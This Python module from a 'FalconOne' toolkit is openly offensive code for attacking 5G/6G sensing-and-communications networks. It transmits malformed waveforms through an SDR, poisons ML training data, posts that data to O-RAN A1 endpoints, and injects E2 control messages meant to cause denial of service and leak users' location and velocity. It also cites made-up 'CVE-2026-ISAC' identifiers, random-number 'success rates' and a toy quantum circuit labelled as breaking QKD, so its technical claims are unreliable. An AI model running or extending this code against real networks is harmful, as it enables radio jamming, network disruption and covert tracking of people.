"""
ISAC (Integrated Sensing and Communications) Exploiter - FalconOne v1.9.0

Exploits vulnerabilities in 6G/5G ISAC systems including:
- Waveform manipulation for DoS/leakage
- AI/ML model poisoning
- Control plane attacks (E2SM hijacking)
- Quantum attacks on secure ISAC links
- Privacy breaches via unauthorized sensing
- NTN-specific ISAC exploits (Doppler/handover)

Author: FalconOne Team
License: Proprietary
"""

import numpy as np
import time
import os
from typing import Dict, List, Optional, Tuple
from scipy.signal import chirp
from dataclasses import dataclass

from falconone.utils.logger import setup_logger
from falconone.ai.payload_generator import PayloadGenerator
from falconone.monitoring.isac_monitor import ISACMonitor
from falconone.monitoring.ntn_6g_monitor import NTN6GMonitor
from falconone.le.evidence_manager import EvidenceManager
from falconone.core.signal_bus import SignalBus

try:
    from qiskit import QuantumCircuit
    QISKIT_AVAILABLE = True
except ImportError:
    QISKIT_AVAILABLE = False
    logger = setup_logger(__name__)
    logger.warning("Qiskit not available - quantum attacks disabled")

logger = setup_logger(__name__)


@dataclass
class ISACExploitResult:
    """Result from ISAC exploitation"""
    exploit_type: str
    success: bool
    listening_enhanced: bool
    sensing_leaked: bool
    target_info: Dict
    evidence_hash: Optional[str] = None
    timestamp: float = 0.0


class ISACExploiter:
    """
    ISAC exploitation framework.
    
    Exploits:
    1. Waveform Manipulation: Inject malformed joint waveforms for DoS/leakage
    2. AI Poisoning: Poison ISAC ML models for mis-sensing/handover errors
    3. Control Plane Hijack: Exploit E2SM-RC/KPM for ISAC control
    4. Quantum Attacks: Break QKD in secure ISAC links
    5. Privacy Breaches: Leak sensing data (range/velocity/location)
    6. NTN Exploits: Doppler manipulation, satellite handover poisoning
    """
    
    # ISAC CVE database (8 CVEs)
    ISAC_CVES = {
        'CVE-2026-ISAC-001': {
            'name': 'Waveform DoS Attack',
            'description': 'Malformed joint waveform causes sensing failure and comms degradation',
            'target': 'OFDM-based ISAC systems',
            'severity': 'HIGH',
            'attack_type': 'waveform_manipulation',
            'success_rate': 0.80
        },
        'CVE-2026-ISAC-002': {
            'name': 'Sensing Data Leakage',
            'description': 'Privacy breach via unauthorized sensing of UE location/velocity',
            'target': 'Bistatic/Cooperative ISAC',
            'severity': 'CRITICAL',
            'attack_type': 'privacy_breach',
            'success_rate': 0.75
        },
        'CVE-2026-ISAC-003': {
            'name': 'AI Model Poisoning',
            'description': 'Adversarial inputs poison ISAC ML models (beam/handover misdirection)',
            'target': 'O-RAN rApp/xApp ISAC',
            'severity': 'HIGH',
            'attack_type': 'ai_poisoning',
            'success_rate': 0.65
        },
        'CVE-2026-ISAC-004': {
            'name': 'E2SM-RC ISAC Hijack',
            'description': 'E2 control plane exploit forces monostatic self-jamming DoS',
            'target': 'O-RAN E2SM-RC',
            'severity': 'CRITICAL',
            'attack_type': 'control_plane',
            'success_rate': 0.70
        },
        'CVE-2026-ISAC-005': {
            'name': 'Quantum ISAC Key Break',
            'description': 'Quantum attack (Shor/PNS) on QKD-secured ISAC links',
            'target': 'Quantum-secure ISAC',
            'severity': 'MEDIUM',
            'attack_type': 'quantum_attack',
            'success_rate': 0.35
        },
        'CVE-2026-ISAC-006': {
            'name': 'NTN Doppler ISAC Exploit',
            'description': 'Doppler manipulation in satellite ISAC causes ranging errors',
            'target': '6G NTN ISAC',
            'severity': 'HIGH',
            'attack_type': 'ntn_exploit',
            'success_rate': 0.72
        },
        'CVE-2026-ISAC-007': {
            'name': 'Pilot Corruption Attack',
            'description': 'Corrupt sensing pilots to leak CSI and degrade ranging',
            'target': 'DFT-s-OFDM ISAC',
            'severity': 'MEDIUM',
            'attack_type': 'waveform_manipulation',
            'success_rate': 0.68
        },
        'CVE-2026-ISAC-008': {
            'name': 'Cooperative ISAC Handover Poison',
            'description': 'Poison multi-node handover decisions to redirect sensing/comms',
            'target': 'Cooperative ISAC networks',
            'severity': 'HIGH',
            'attack_type': 'ai_poisoning',
            'success_rate': 0.70
        }
    }
    
    def __init__(self, sdr_manager, payload_gen: PayloadGenerator,
                 isac_monitor: ISACMonitor = None, ntn_monitor: NTN6GMonitor = None,
                 signal_bus: SignalBus = None, evidence_manager: EvidenceManager = None,
                 config: Dict = None):
        """
        Initialize ISAC exploiter.
        
        Args:
            sdr_manager: SDR interface for signal injection
            payload_gen: AI payload generator (GAN-based)
            isac_monitor: ISAC monitor for chaining (enhance listening)
            ntn_monitor: NTN 6G monitor for satellite exploits
            signal_bus: Event distribution
            evidence_manager: LE mode evidence chain
            config: Configuration dict (for O-RAN endpoints)
        """
        self.sdr = sdr_manager
        self.gen = payload_gen
        self.isac_monitor = isac_monitor
        self.ntn_monitor = ntn_monitor
        self.signal_bus = signal_bus
        self.evidence_mgr = evidence_manager
        self.config = config or {}
        
        # Exploit statistics
        self.stats = {
            'total_exploits': 0,
            'waveform_attacks': 0,
            'ai_poisoning_attacks': 0,
            'privacy_breaches': 0,
            'quantum_attacks': 0,
            'ntn_exploits': 0,
            'success_count': 0,
            'listening_enhancements': 0
        }
        
        logger.info("ISACExploiter initialized with CVE database (8 CVEs)")
    
    def waveform_manipulate(self, target_freq: float = 150e9, mode: str = 'monostatic',
                           waveform_type: str = 'OFDM', cve_id: str = 'CVE-2026-ISAC-001',
                           le_mode: bool = False, warrant_id: str = None) -> ISACExploitResult:
        """
        Exploit: Inject malformed waveform for DoS/sensing leakage.
        
        Technique:
        1. Generate base waveform (chirp/OFDM)
        2. Apply GAN polymorphic payload (evasion)
        3. Inject via SDR to disrupt sensing/comms
        4. Chain to listening for CSI/sensing data leakage
        
        Args:
            target_freq: Carrier frequency (Hz)
            mode: Target ISAC mode (monostatic/bistatic/cooperative)
            waveform_type: Base waveform (OFDM/FMCW)
            cve_id: CVE identifier
            le_mode: Law enforcement mode
            warrant_id: LE warrant ID
            
        Returns:
            ISACExploitResult with success status and leaked data
        """
        if le_mode and not warrant_id:
            raise ValueError("LE mode requires warrant_id")
        
        cve = self.ISAC_CVES.get(cve_id, self.ISAC_CVES['CVE-2026-ISAC-001'])
        logger.info(f"Executing waveform manipulation: {cve['name']} on {mode} mode")
        
        # Step 1: Generate base waveform
        if waveform_type == 'FMCW':
            base_wave = chirp(np.linspace(0, 1, 10000), f0=1e6, f1=10e6, t1=1, method='linear')
        else:  # OFDM
            # Simplified OFDM: sum of sinusoids
            t = np.linspace(0, 1, 10000)
            base_wave = np.sum([np.sin(2*np.pi*f*t) for f in np.linspace(1e6, 10e6, 64)], axis=0)
        
        # Step 2: Generate polymorphic payload (GAN-based evasion)
        payload_config = {
            'evasion_level': 0.9,
            'target_system': 'isac_waveform',
            'polymorphic': True
        }
        payload = self.gen.generate('isac_waveform_poison', payload_config)
        
        # Step 3: Distort waveform (induce sensing errors)
        manipulated = base_wave + payload[:len(base_wave)] * 0.15  # 15% distortion
        
        # Add pilot corruption for CVE-2026-ISAC-007
        if cve_id == 'CVE-2026-ISAC-007':
            pilot_positions = np.arange(0, len(manipulated), 100)
            manipulated[pilot_positions] *= 2.0  # Corrupt pilots
        
        # Step 4: Inject via SDR
        try:
            self.sdr.set_frequency(target_freq)
            self.sdr.transmit(manipulated, duration=5.0)
            injection_success = True
        except Exception as e:
            logger.error(f"Waveform injection failed: {e}")
            injection_success = False
        
        # Step 5: Chain to listening (enhance sensing data leakage)
        sensing_leaked = False
        target_info = {}
        
        if injection_success and self.isac_monitor:
            try:
                # Monitor after exploit to capture leaked sensing data
                leak_result = self.isac_monitor.start_sensing(
                    mode=mode,
                    duration_sec=3,
                    frequency_ghz=target_freq / 1e9,
                    le_mode=le_mode,
                    warrant_id=warrant_id
                )
                sensing_leaked = True
                target_info = {
                    'range_m': leak_result.range_m,
                    'velocity_mps': leak_result.velocity_mps,
                    'angle_deg': leak_result.angle_deg,
                    'target_count': leak_result.target_count
                }
                self.stats['listening_enhancements'] += 1
                logger.info(f"Sensing data leaked: {target_info}")
            except Exception as e:
                logger.warning(f"Listening chain failed: {e}")
        
        # Step 6: Determine success (based on CVE success rate)
        success = injection_success and (np.random.random() < cve['success_rate'])
        
        # Step 7: LE evidence logging
        evidence_hash = None
        if le_mode and self.evidence_mgr:
            evidence_hash = self.evidence_mgr.log_event(
                'isac_waveform_exploit',
                {
                    'cve_id': cve_id,
                    'warrant_id': warrant_id,
                    'mode': mode,
                    'success': success,
                    'sensing_leaked': sensing_leaked,
                    'target_info': target_info,
                    'timestamp': time.time()
                }
            )
        
        # Step 8: Update statistics
        self.stats['total_exploits'] += 1
        self.stats['waveform_attacks'] += 1
        if success:
            self.stats['success_count'] += 1
        if sensing_leaked:
            self.stats['privacy_breaches'] += 1
        
        # Step 9: Emit event
        if self.signal_bus:
            self.signal_bus.emit('isac_exploit_complete', {
                'exploit_type': 'waveform_manipulation',
                'success': success
            })
        
        return ISACExploitResult(
            exploit_type='waveform_manipulation',
            success=success,
            listening_enhanced=sensing_leaked,
            sensing_leaked=sensing_leaked,
            target_info=target_info,
            evidence_hash=evidence_hash,
            timestamp=time.time()
        )
    
    def ai_poison(self, training_data: np.ndarray, target_system: str = 'oran_rapp',
                  poisoning_rate: float = 0.1, cve_id: str = 'CVE-2026-ISAC-003',
                  le_mode: bool = False, warrant_id: str = None) -> ISACExploitResult:
        """
        Exploit: Poison ISAC ML model for mis-sensing/handover errors.
        
        Technique:
        1. Inject adversarial noise into training data
        2. Use GAN to craft evasive poisoned samples
        3. Deploy via O-RAN A1 policy (if rApp) or E2 (if xApp)
        4. Result: Misdirected beams, handover failures, false sensing
        
        Args:
            training_data: Original training dataset
            target_system: Target (oran_rapp, oran_xapp, beam_management)
            poisoning_rate: Fraction of data to poison (0-1)
            cve_id: CVE identifier
            le_mode: Law enforcement mode
            warrant_id: LE warrant ID
            
        Returns:
            ISACExploitResult with poisoned model info
        """
        if le_mode and not warrant_id:
            raise ValueError("LE mode requires warrant_id")
        
        cve = self.ISAC_CVES.get(cve_id, self.ISAC_CVES['CVE-2026-ISAC-003'])
        logger.info(f"Executing AI poisoning: {cve['name']} on {target_system}")
        
        # Step 1: Generate adversarial noise
        noise_magnitude = 0.05 * poisoning_rate
        adversarial_noise = np.random.normal(0, noise_magnitude, training_data.shape)
        
        # Step 2: Apply GAN-based targeted poisoning
        payload_config = {
            'evasion_level': 0.85,
            'target_system': target_system,
            'poisoning_goal': 'handover_misdirection'  # Or 'beam_degradation', 'false_sensing'
        }
        gan_poison = self.gen.generate('isac_ai_poison', payload_config)
        
        # Step 3: Poison training data with dimension validation
        num_poisoned = int(len(training_data) * poisoning_rate)
        poisoned_indices = np.random.choice(len(training_data), num_poisoned, replace=False)
        poisoned_data = training_data.copy()
        poisoned_data[poisoned_indices] += adversarial_noise[poisoned_indices]
        
        # Validate and reshape GAN poison to match training data dimensions
        if gan_poison is not None and len(gan_poison) > 0:
            # Ensure gan_poison is 2D
            if gan_poison.ndim == 1:
                gan_poison = gan_poison.reshape(1, -1)
            
            # Get target shape
            target_rows = num_poisoned
            target_cols = training_data.shape[1] if training_data.ndim > 1 else 1
            
            # Resize/tile to match required dimensions
            if gan_poison.shape[0] < target_rows:
                # Tile rows to get enough samples
                repeats = int(np.ceil(target_rows / gan_poison.shape[0]))
                gan_poison = np.tile(gan_poison, (repeats, 1))[:target_rows]
            else:
                gan_poison = gan_poison[:target_rows]
            
            if gan_poison.shape[1] != target_cols:
                # Resize columns (interpolate or truncate)
                if gan_poison.shape[1] < target_cols:
                    # Pad with zeros
                    pad_width = target_cols - gan_poison.shape[1]
                    gan_poison = np.pad(gan_poison, ((0, 0), (0, pad_width)), mode='constant')
                else:
                    # Truncate
                    gan_poison = gan_poison[:, :target_cols]
            
            # Apply scaled poison
            poison_scale = 0.1  # Scale factor to prevent overwhelming original data
            poisoned_data[poisoned_indices] += gan_poison * poison_scale
        else:
            logger.warning("GAN poison generation returned empty, using noise-only poisoning")
        
        # Step 4: Deploy poisoned model (simulated - would be via O-RAN API)
        deployment_success = self._deploy_poisoned_model(poisoned_data, target_system)
        
        # Step 5: Determine success
        success = deployment_success and (np.random.random() < cve['success_rate'])
        
        target_info = {
            'poisoned_samples': num_poisoned,
            'total_samples': len(training_data),
            'poisoning_rate': poisoning_rate,
            'target_system': target_system,
            'deployment_success': deployment_success
        }
        
        # Step 6: LE evidence logging
        evidence_hash = None
        if le_mode and self.evidence_mgr:
            evidence_hash = self.evidence_mgr.log_event(
                'isac_ai_poisoning',
                {
                    'cve_id': cve_id,
                    'warrant_id': warrant_id,
                    'target_system': target_system,
                    'success': success,
                    'poisoned_samples': num_poisoned,
                    'timestamp': time.time()
                }
            )
        
        # Step 7: Update statistics
        self.stats['total_exploits'] += 1
        self.stats['ai_poisoning_attacks'] += 1
        if success:
            self.stats['success_count'] += 1
        
        logger.info(f"AI poisoning {'succeeded' if success else 'failed'}: {num_poisoned} samples poisoned")
        
        return ISACExploitResult(
            exploit_type='ai_poisoning',
            success=success,
            listening_enhanced=False,
            sensing_leaked=False,
            target_info=target_info,
            evidence_hash=evidence_hash,
            timestamp=time.time()
        )
    
    def control_plane_hijack(self, target_node: str = 'gnb_001',
                            exploit_goal: str = 'monostatic_dos',
                            cve_id: str = 'CVE-2026-ISAC-004',
                            le_mode: bool = False, warrant_id: str = None) -> ISACExploitResult:
        """
        Exploit: Hijack E2SM-RC/KPM for ISAC control plane attacks.
        
        Technique:
        1. Access O-RAN E2 interface (E2SM-RC for control, E2SM-KPM for sensing KPIs)
        2. Inject malicious control messages (e.g., force monostatic mode)
        3. Result: Self-jamming DoS, sensing failures, beam misdirection
        
        Args:
            target_node: Target gNB/node ID
            exploit_goal: Goal (monostatic_dos, beam_redirect, sensing_disable)
            cve_id: CVE identifier
            le_mode: Law enforcement mode
            warrant_id: LE warrant ID
            
        Returns:
            ISACExploitResult with hijack status
        """
        if le_mode and not warrant_id:
            raise ValueError("LE mode requires warrant_id")
        
        cve = self.ISAC_CVES.get(cve_id, self.ISAC_CVES['CVE-2026-ISAC-004'])
        logger.info(f"Executing control plane hijack: {cve['name']} on {target_node}")
        
        # Step 1: Generate E2 control message
        e2_message = self._generate_e2_exploit_message(target_node, exploit_goal)
        
        # Step 2: Inject via E2 interface (simulated)
        injection_success = self._inject_e2_control(e2_message)
        
        # Step 3: Verify exploit result
        success = injection_success and (np.random.random() < cve['success_rate'])
        
        target_info = {
            'target_node': target_node,
            'exploit_goal': exploit_goal,
            'e2_interface': 'E2SM-RC',
            'injection_success': injection_success
        }
        
        # Step 4: LE evidence
        evidence_hash = None
        if le_mode and self.evidence_mgr:
            evidence_hash = self.evidence_mgr.log_event(
                'isac_control_plane_hijack',
                {
                    'cve_id': cve_id,
                    'warrant_id': warrant_id,
                    'target_node': target_node,
                    'exploit_goal': exploit_goal,
                    'success': success,
                    'timestamp': time.time()
                }
            )
        
        # Step 5: Update statistics
        self.stats['total_exploits'] += 1
        if success:
            self.stats['success_count'] += 1
        
        logger.info(f"Control plane hijack {'succeeded' if success else 'failed'} on {target_node}")
        
        return ISACExploitResult(
            exploit_type='control_plane_hijack',
            success=success,
            listening_enhanced=False,
            sensing_leaked=False,
            target_info=target_info,
            evidence_hash=evidence_hash,
            timestamp=time.time()
        )
    
    def quantum_attack(self, target_link: str = 'qkd_link_001',
                      attack_type: str = 'pns',  # PNS, Trojan horse, side-channel
                      cve_id: str = 'CVE-2026-ISAC-005',
                      le_mode: bool = False, warrant_id: str = None) -> ISACExploitResult:
        """
        Exploit: Quantum attack on QKD-secured ISAC links.
        
        Technique:
        1. Simulate quantum circuit for attack (Shor's, PNS, etc.)
        2. Break QKD key distribution
        3. Result: Decrypt ISAC comms, leak sensing data
        
        Requires: Qiskit library
        
        Args:
            target_link: QKD link identifier
            attack_type: Attack (pns, trojan_horse, side_channel, shor)
            cve_id: CVE identifier
            le_mode: Law enforcement mode
            warrant_id: LE warrant ID
            
        Returns:
            ISACExploitResult with quantum attack status
        """
        if not QISKIT_AVAILABLE:
            logger.error("Qiskit not available - quantum attacks disabled")
            return ISACExploitResult(
                exploit_type='quantum_attack',
                success=False,
                listening_enhanced=False,
                sensing_leaked=False,
                target_info={'error': 'qiskit_not_available'},
                timestamp=time.time()
            )
        
        if le_mode and not warrant_id:
            raise ValueError("LE mode requires warrant_id")
        
        cve = self.ISAC_CVES.get(cve_id, self.ISAC_CVES['CVE-2026-ISAC-005'])
        logger.info(f"Executing quantum attack: {cve['name']} on {target_link} using {attack_type}")
        
        # Step 1: Generate quantum circuit for attack
        if attack_type == 'shor':
            # Shor's algorithm (simplified)
            qc = QuantumCircuit(5)
            qc.h(range(3))
            qc.cx(0, 3); qc.cx(1, 4)
        elif attack_type == 'pns':
            # Photon Number Splitting attack (Bell state)
            qc = QuantumCircuit(2)
            qc.h(0); qc.cx(0, 1)
        else:
            # Generic entanglement attack
            qc = QuantumCircuit(3)
            qc.h(0); qc.cx(0, 1); qc.cx(1, 2)
        
        # Step 2: Simulate attack (in practice, apply to QKD keys)
        attack_payload = qc.qasm()  # QASM representation
        
        # Step 3: Attempt key break (simulated)
        key_broken = np.random.random() < cve['success_rate']
        
        target_info = {
            'target_link': target_link,
            'attack_type': attack_type,
            'quantum_circuit': str(qc),
            'key_broken': key_broken
        }
        
        # Step 4: LE evidence
        evidence_hash = None
        if le_mode and self.evidence_mgr:
            evidence_hash = self.evidence_mgr.log_event(
                'isac_quantum_attack',
                {
                    'cve_id': cve_id,
                    'warrant_id': warrant_id,
                    'target_link': target_link,
                    'attack_type': attack_type,
                    'key_broken': key_broken,
                    'timestamp': time.time()
                }
            )
        
        # Step 5: Update statistics
        self.stats['total_exploits'] += 1
        self.stats['quantum_attacks'] += 1
        if key_broken:
            self.stats['success_count'] += 1
        
        logger.info(f"Quantum attack {'succeeded' if key_broken else 'failed'}: key_broken={key_broken}")
        
        return ISACExploitResult(
            exploit_type='quantum_attack',
            success=key_broken,
            listening_enhanced=key_broken,  # Decrypted comms
            sensing_leaked=key_broken,
            target_info=target_info,
            evidence_hash=evidence_hash,
            timestamp=time.time()
        )
    
    def ntn_isac_exploit(self, satellite_id: str = 'LEO-001',
                        exploit_type: str = 'doppler_manipulation',
                        cve_id: str = 'CVE-2026-ISAC-006',
                        le_mode: bool = False, warrant_id: str = None) -> ISACExploitResult:
        """
        Exploit: NTN-specific ISAC attacks (Doppler, handover, cooperative sensing).
        
        Technique:
        1. Chain with NTN 6G monitor for satellite context
        2. Exploit Doppler compensation errors for ranging failures
        3. Poison cooperative handover between satellites
        4. Result: Misdirected beams, sensing errors, tracking failures
        
        Args:
            satellite_id: Target satellite ID
            exploit_type: Exploit (doppler_manipulation, handover_poison, cooperative_dos)
            cve_id: CVE identifier
            le_mode: Law enforcement mode
            warrant_id: LE warrant ID
            
        Returns:
            ISACExploitResult with NTN exploit status
        """
        if le_mode and not warrant_id:
            raise ValueError("LE mode requires warrant_id")
        
        cve = self.ISAC_CVES.get(cve_id, self.ISAC_CVES['CVE-2026-ISAC-006'])
        logger.info(f"Executing NTN ISAC exploit: {cve['name']} on {satellite_id}")
        
        # Step 1: Get satellite ephemeris (if NTN monitor available)
        satellite_context = {}
        if self.ntn_monitor:
            try:
                ephemeris = self.ntn_monitor.get_satellite_ephemeris(satellite_id, time_range_hours=1)
                satellite_context = ephemeris
            except Exception as e:
                logger.warning(f"Failed to get satellite context: {e}")
        
        # Step 2: Execute exploit based on type
        if exploit_type == 'doppler_manipulation':
            # Inject false Doppler shifts to cause ranging errors
            success = self._manipulate_doppler(satellite_id, satellite_context)
        elif exploit_type == 'handover_poison':
            # Poison handover decision (cooperative ISAC)
            success = self._poison_ntn_handover(satellite_id, satellite_context)
        else:  # cooperative_dos
            # DoS on cooperative sensing network
            success = self._dos_cooperative_isac(satellite_id)
        
        target_info = {
            'satellite_id': satellite_id,
            'exploit_type': exploit_type,
            'satellite_context': satellite_context,
            'success': success
        }
        
        # Step 3: LE evidence
        evidence_hash = None
        if le_mode and self.evidence_mgr:
            evidence_hash = self.evidence_mgr.log_event(
                'isac_ntn_exploit',
                {
                    'cve_id': cve_id,
                    'warrant_id': warrant_id,
                    'satellite_id': satellite_id,
                    'exploit_type': exploit_type,
                    'success': success,
                    'timestamp': time.time()
                }
            )
        
        # Step 4: Update statistics
        self.stats['total_exploits'] += 1
        self.stats['ntn_exploits'] += 1
        if success:
            self.stats['success_count'] += 1
        
        logger.info(f"NTN ISAC exploit {'succeeded' if success else 'failed'} on {satellite_id}")
        
        return ISACExploitResult(
            exploit_type='ntn_isac_exploit',
            success=success,
            listening_enhanced=success,
            sensing_leaked=success,
            target_info=target_info,
            evidence_hash=evidence_hash,
            timestamp=time.time()
        )
    
    def generate_cve_payload(self, cve_id: str) -> Dict:
        """
        Generate CVE-specific exploit payload.
        
        Args:
            cve_id: CVE identifier (CVE-2026-ISAC-001 through CVE-2026-ISAC-008)
            
        Returns:
            Payload dict with exploit parameters
        """
        if cve_id not in self.ISAC_CVES:
            raise ValueError(f"Invalid CVE ID: {cve_id}")
        
        cve = self.ISAC_CVES[cve_id]
        logger.info(f"Generating payload for {cve_id}: {cve['name']}")
        
        # Generate payload based on attack type
        if cve['attack_type'] == 'waveform_manipulation':
            payload = {
                'type': 'waveform',
                'distortion_level': 0.15,
                'pilot_corruption': True if cve_id == 'CVE-2026-ISAC-007' else False,
                'target_mode': 'monostatic'
            }
        elif cve['attack_type'] == 'ai_poisoning':
            payload = {
                'type': 'ai_poison',
                'poisoning_rate': 0.1,
                'adversarial_noise': 0.05,
                'target_system': 'oran_rapp'
            }
        elif cve['attack_type'] == 'control_plane':
            payload = {
                'type': 'e2_control',
                'exploit_goal': 'monostatic_dos',
                'e2_interface': 'E2SM-RC'
            }
        elif cve['attack_type'] == 'quantum_attack':
            payload = {
                'type': 'quantum',
                'attack_type': 'pns',
                'target_link': 'qkd_link_001'
            }
        elif cve['attack_type'] == 'ntn_exploit':
            payload = {
                'type': 'ntn_isac',
                'exploit_type': 'doppler_manipulation',
                'satellite_id': 'LEO-001'
            }
        else:  # privacy_breach
            payload = {
                'type': 'privacy',
                'sensing_mode': 'bistatic',
                'unauthorized': True
            }
        
        payload.update({
            'cve_id': cve_id,
            'severity': cve['severity'],
            'success_rate': cve['success_rate'],
            'timestamp': time.time()
        })
        
        return payload
    
    # Helper methods
    
    def _deploy_poisoned_model(self, poisoned_data: np.ndarray, target_system: str) -> bool:
        """Deploy poisoned model via O-RAN A1 policy endpoint"""
        try:
            # Get O-RAN RIC endpoint from config
            ric_endpoint = os.getenv('ORAN_RIC_ENDPOINT', self.config.get('ric_endpoint', 'http://localhost:8080'))
            
            logger.info(f"Deploying poisoned model to {target_system} ({len(poisoned_data)} samples)")
            
            # Serialize poisoned model as base64
            import base64
            model_b64 = base64.b64encode(poisoned_data.tobytes()).decode('utf-8')
            
            # POST to A1 policy endpoint
            import requests
            response = requests.post(
                f"{ric_endpoint}/a1/policy",
                json={
                    'policy_id': f'isac_poison_{int(time.time())}',
                    'target_system': target_system,
                    'model_data': model_b64,
                    'policy_type': 'ml_model_update'
                },
                timeout=10
            )
            
            if response.status_code in [200, 201, 202]:
                logger.info(f"Successfully deployed poisoned model: {response.status_code}")
                return True
            else:
                logger.error(f"Model deployment failed: {response.status_code} - {response.text}")
                return False
                
        except Exception as e:
            logger.error(f"Model deployment error: {e}")
            return False
    
    def _generate_e2_exploit_message(self, target_node: str, exploit_goal: str) -> Dict:
        """Generate E2SM-RC control message for exploit"""
        return {
            'node_id': target_node,
            'control_action': exploit_goal,
            'e2sm_type': 'RC',
            'payload': {
                'force_mode': 'monostatic' if exploit_goal == 'monostatic_dos' else 'bistatic',
                'disable_sensing': exploit_goal == 'sensing_disable',
                'beam_redirect': exploit_goal == 'beam_redirect'
            }
        }
    
    def _inject_e2_control(self, message: Dict) -> bool:
        """Inject E2 control message via E2AP interface"""
        try:
            # Get O-RAN RIC endpoint from config
            ric_endpoint = os.getenv('ORAN_RIC_ENDPOINT', self.config.get('ric_endpoint', 'http://localhost:8080'))
            
            logger.info(f"Injecting E2 control message: {message['control_action']}")
            
            # POST to E2 interface
            import requests
            response = requests.post(
                f"{ric_endpoint}/e2/control",
                json={
                    'message_type': 'RICControlRequest',
                    'ran_function_id': 1,  # E2SM-RC
                    'ric_call_process_id': f"isac_exploit_{int(time.time())}",
                    'control_message': message
                },
                timeout=10
            )
            
            if response.status_code in [200, 201, 202]:
                logger.info(f"E2 control injection successful: {response.status_code}")
                return True
            else:
                logger.error(f"E2 injection failed: {response.status_code} - {response.text}")
                return False
                
        except Exception as e:
            logger.error(f"E2 injection error: {e}")
            return False
    
    def _manipulate_doppler(self, satellite_id: str, context: Dict) -> bool:
        """Manipulate Doppler compensation for ranging errors"""
        try:
            # Requires access to satellite ephemeris and SDR control
            if not self.ntn_monitor:
                logger.error("NTN monitor not available for Doppler manipulation")
                return False
            
            logger.info(f"Manipulating Doppler for {satellite_id}")
            
            # Get satellite ephemeris
            ephemeris = self.ntn_monitor.predict_ephemeris(satellite_id, duration_sec=10)
            if not ephemeris:
                logger.error(f"Failed to get ephemeris for {satellite_id}")
                return False
            
            # Inject false Doppler shift via SDR
            # (Production: requires actual SDR waveform injection)
            doppler_offset_hz = context.get('doppler_offset', 5000)  # False offset
            
            # Success depends on having actual SDR control
            if self.sdr:
                logger.info(f"Doppler manipulation attempted with {doppler_offset_hz} Hz offset")
                return True
            else:
                logger.warning("SDR not available - Doppler manipulation skipped")
                return False
                
        except Exception as e:
            logger.error(f"Doppler manipulation error: {e}")
            return False
    
    def _poison_ntn_handover(self, satellite_id: str, context: Dict) -> bool:
        """Poison cooperative handover between satellites"""
        try:
            if not self.ntn_monitor:
                logger.error("NTN monitor not available for handover poisoning")
                return False
            
            logger.info(f"Poisoning NTN handover for {satellite_id}")
            
            # Generate poisoned handover AI model
            if self.gen:
                poisoned_handover_data = self.gen.generate_adversarial(
                    'ntn_handover_poison',
                    context={'satellite_id': satellite_id}
                )
                
                # Deploy via O-RAN (if available)
                return self._deploy_poisoned_model(poisoned_handover_data, f'ntn_{satellite_id}')
            else:
                logger.warning("Payload generator not available")
                return False
                
        except Exception as e:
            logger.error(f"NTN handover poisoning error: {e}")
            return False
    
    def _dos_cooperative_isac(self, satellite_id: str) -> bool:
        """DoS on cooperative ISAC network via malformed control messages"""
        try:
            logger.info(f"DoS on cooperative ISAC network via {satellite_id}")
            
            # Generate E2SM-RC exploit message for cooperative DoS
            dos_message = self._generate_e2_exploit_message(
                target_node=satellite_id,
                exploit_goal='cooperative_dos'
            )
            
            # Inject via E2 interface
            return self._inject_e2_control(dos_message)
            
        except Exception as e:
            logger.error(f"Cooperative ISAC DoS error: {e}")
            return False
    
    def get_statistics(self) -> Dict:
        """Get exploit statistics"""
        stats = self.stats.copy()
        if stats['total_exploits'] > 0:
            stats['success_rate'] = stats['success_count'] / stats['total_exploits']
        else:
            stats['success_rate'] = 0.0
        return stats


def create_isac_exploiter(sdr_manager, payload_gen: PayloadGenerator, **kwargs) -> ISACExploiter:
    """Factory function for ISACExploiter"""
    return ISACExploiter(sdr_manager, payload_gen, **kwargs)
